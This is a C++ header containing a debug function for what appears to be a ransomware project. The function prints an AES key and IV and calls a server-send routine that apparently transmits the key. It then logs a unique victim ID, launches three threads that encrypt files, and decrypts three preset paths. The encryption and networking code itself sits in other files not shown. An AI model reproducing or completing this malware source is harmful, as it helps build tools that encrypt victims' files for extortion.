#pragma once
#include "threading.h"
#include "communications.h"
// had to put all this shit in a header cus i like my main to be clean asf // -> skar too ud

auto __debug() -> void
{
    std::cout << "\n [ __DEBUG_MODE ] -> true!";

    // some debug info :)
    std::cout << "\n\n [ key ] -> ";
    for (int i = 0; i < AES::DEFAULT_KEYLENGTH; ++i) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(key[i]);
    }

    std::cout << "\n [ __iv ] -> ";
    for (int i = 0; i < AES::DEFAULT_KEYLENGTH; ++i) {
        std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(__iv[i]);
    }

    std::cout << "\n [ server ] -> sending...";
    __server_send(); // to do -> add predefined static pgp - done
    std::cout << "\n [ server ] -> sent.";
    std::cout << "\n [ unique_id ] -> " << __unique_id;

    std::cout << std::dec << std::endl;
    std::cout << "\n [ compile_time ] -> " << compile_time;

    std::cout << "\n\n [ dbg ] -> press enter to call encryption thread! -> " << __FILE__ << ":" << __LINE__;
    cin.get();

    std::cout << "\n [ dbg ] -> calling encryption thread -> " << __FILE__ << ":" << __LINE__;
    std::thread __encrypt_thread(aes_encrypt_files_thread);
    std::thread __encrypt_thread_2(aes_encrypt_files_thread_2);
    std::thread __encrypt_thread_3(aes_encrypt_files_thread_3);

    std::cout << "\n [ dbg ] -> encrypted! -> " << __FILE__ << ":" << __LINE__;
    std::cout << "\n\n [ dbg ] -> press enter to call decrypt thread! -> " << __FILE__ << ":" << __LINE__;
    cin.get();

    std::cout << "\n\n [ dbg ] -> callin decryption thread! -> " << __FILE__ << ":" << __LINE__;
    aes_decrypt_files(__path);
    aes_decrypt_files(__path_2);
    aes_decrypt_files(__path_3);

    std::cout << "\n [ dbg ] -> press enter to exit with code (1) -> " << __FILE__ << ":" << __LINE__;
    cin.get();
    exit(1);
}